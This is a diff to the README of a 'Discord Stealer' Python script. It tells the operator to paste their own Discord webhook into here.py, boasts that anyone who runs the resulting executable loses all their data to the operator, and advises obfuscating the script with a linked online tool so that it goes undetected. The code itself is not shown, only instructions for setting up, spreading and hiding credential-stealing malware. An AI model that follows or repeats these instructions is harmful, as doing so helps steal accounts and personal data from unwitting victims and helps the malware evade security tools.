@@ -1,12 +1,16 @@
-# Discord-Py-Stealer
+# Discord Stealer
 
-Open here.py with vscode, sublime text or notepad++
+Firts step is
 
-just put u webhook on
+1 Open here.py with vscode, sublime text or notepad++
+
+2 just put u webhook on
 
 hook = "webhook here"
 
-> not a image logger, just a executable py, u can obsfuscate for undectetable
+done, if someon execute is gg for him, u will all from him
+
+> u can obsfuscate for undectetable
 
 Obsfuscate here https://freecodingtools.org/tools/obfuscator/python
 
